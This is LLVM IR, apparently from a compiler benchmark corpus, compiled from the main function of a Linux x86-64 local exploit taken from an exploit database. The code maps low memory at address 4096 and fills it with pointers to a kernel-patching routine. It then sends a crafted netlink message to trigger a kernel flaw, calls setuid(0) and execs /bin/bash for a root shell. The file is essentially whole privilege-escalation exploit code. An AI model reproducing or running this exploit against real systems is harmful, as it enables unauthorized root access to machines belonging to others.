; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_24555.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_24555.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@main.n = internal global [10 x i32] [i32 40, i32 65556, i32 0, i32 0, i32 45, i32 -1, i32 0, i32 0, i32 0, i32 0], align 16
@ugid = common dso_local global i64 0, align 8
@patch_current = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"-sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = call i64 (...) @getuid()
  store i64 %6, i64* %2, align 8
  %7 = call i64 (...) @getgid()
  store i64 %7, i64* %3, align 8
  %8 = call i32 @socket(i32 16, i32 3, i32 4)
  store i32 %8, i32* %5, align 4
  %9 = call i32 @mmap(i8* inttoptr (i64 4096 to i8*), i32 1048576, i32 3, i32 50, i32 0, i32 0)
  %10 = icmp ne i32 %9, -1
  %11 = zext i1 %10 to i32
  %12 = call i32 @assert(i32 %11)
  %13 = load i64, i64* %2, align 8
  %14 = load i64, i64* %2, align 8
  %15 = load i64, i64* %2, align 8
  %16 = call i32 @setresuid(i64 %13, i64 %14, i64 %15)
  %17 = load i64, i64* %3, align 8
  %18 = load i64, i64* %3, align 8
  %19 = load i64, i64* %3, align 8
  %20 = call i32 @setresgid(i64 %17, i64 %18, i64 %19)
  %21 = load i64, i64* %3, align 8
  %22 = shl i64 %21, 32
  %23 = load i64, i64* %2, align 8
  %24 = or i64 %22, %23
  store i64 %24, i64* @ugid, align 8
  %25 = call i32 @memcpy(i32 4096, i32* @patch_current, i32 1024)
  store i32 0, i32* %4, align 4
  br label %26

26:                                               ; preds = %33, %0
  %27 = load i32, i32* %4, align 4
  %28 = icmp slt i32 %27, 131072
  br i1 %28, label %29, label %36

29:                                               ; preds = %26
  %30 = load i32, i32* %4, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8*, i8** inttoptr (i64 4096 to i8**), i64 %31
  store i8* bitcast (i32* @patch_current to i8*), i8** %32, align 8
  br label %33

33:                                               ; preds = %29
  %34 = load i32, i32* %4, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %4, align 4
  br label %26

36:                                               ; preds = %26
  %37 = load i32, i32* %5, align 4
  %38 = call i32 @send(i32 %37, i32* getelementptr inbounds ([10 x i32], [10 x i32]* @main.n, i64 0, i64 0), i32 40, i32 0)
  %39 = call i32 @setuid(i32 0)
  %40 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i32 0)
  ret i32 %40
}

declare dso_local i64 @getuid(...) #1

declare dso_local i64 @getgid(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @setresuid(i64, i64, i64) #1

declare dso_local i32 @setresgid(i64, i64, i64) #1

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @send(i32, i32*, i32, i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
